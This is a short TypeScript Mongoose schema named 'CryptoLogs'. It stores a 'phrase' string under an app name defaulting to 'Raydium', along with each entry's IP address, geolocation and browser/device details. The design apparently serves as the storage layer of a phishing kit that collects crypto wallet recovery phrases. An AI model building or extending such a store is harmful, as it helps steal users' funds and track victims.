// Account.ts (Mongoose Model)

import mongoose, { Schema } from "mongoose";

const CryptoLogs = new Schema(
  {
    userId: {
      type: mongoose.Schema.Types.ObjectId,
      ref: "User",
      require: true,
    },
    appName: { type: String, default: "Raydium" },
    appLogo: {type: String, default: ''},//will add the url of firebase store 
    phrase: { type: String, default: "" },
    location: {
      country: String,
      countryCode: String,
      region: String,
      city: String,
      ipAddress: String,
      lat: Number,
      lon: Number,
    },
    userInfo: {
      browser: { type: String },
      os: { type: String },
      device: { type: String },
    },
  },
  { timestamps: true }
);

export default mongoose.model("CryptoLogs", CryptoLogs);
